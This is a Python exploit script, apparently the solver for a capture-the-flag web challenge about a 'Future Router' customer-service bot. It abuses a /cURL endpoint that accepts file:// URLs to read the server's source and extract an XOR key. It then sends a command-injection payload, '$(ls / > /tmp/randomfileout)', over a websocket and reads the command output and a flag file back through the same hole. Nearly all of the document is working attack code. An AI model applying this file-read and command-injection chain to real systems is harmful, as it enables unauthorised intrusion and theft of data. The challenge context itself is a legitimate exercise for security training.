import requests as r
from websockets.sync.client import connect



class KarenCustomerServiceAgent:
    SECRET_KEY = bytearray(b"\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula.")
    Dialogue = {
        "Welcome":"Hello! Welcome to the Future Router service bot!",
        "Secret formula":"Thank you for your input, we will process your request in 1-3 business days",
        "Problem":"Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue"
    }
    def xor_decrypt(self,ciphertext):
        plaintext = ""
        cipher_arr = bytearray(ciphertext)
        for i in range(0,len(cipher_arr)):
            plaintext += chr(cipher_arr[i] ^ self.SECRET_KEY[i % len(self.SECRET_KEY)])
        return plaintext

KarenAgent = KarenCustomerServiceAgent()

HOSTNAME = "localhost:33044"

print("Checking LFI... LFI works!")
r1 = r.post(f"http://{HOSTNAME}/cURL",headers={
    'Content-Type':'application/json'
},json={
    'URL':'file:///proc/self/cwd/blueprints/../karen/customerservice.py'
})


if "SECRET" in r1.text:
    print("Successfully, exploited LFI!")
else:
    print("LFI failed... Is the httpserver server working?")
    exit()

data = KarenAgent.xor_decrypt(b"krabby patty $(ls / > /tmp/randomfileout)")


with connect(f"ws://{HOSTNAME}/app/") as websocket:
    websocket.send(data)
    message = websocket.recv()
    if "Thank you" in message:
        print("Recieved valid response from websocket!")
    else:
        print("Websocket failed to send and/or recv. Is the socketserver down?")
        exit()


r1 = r.post(f"http://{HOSTNAME}/cURL",headers={
    'Content-Type':'application/json'
},json={
    'URL':'file:///tmp/randomfileout'
})


if "flag" in r1.text:
    print("Exfiltrated command via tmp sucessfully!")
    print(r1.json()['success'])
else:
    print("Command output is not in /tmp . The command did not execute or we were unable to write to /tmp.")
    exit()

r1 = r.post(f"http://{HOSTNAME}/cURL",headers={
    'Content-Type':'application/json'
},json={
    'URL':'file:///flag53958e73c5ba4a66'
})


print(f"Your flag should be {r1.json()['success']}")
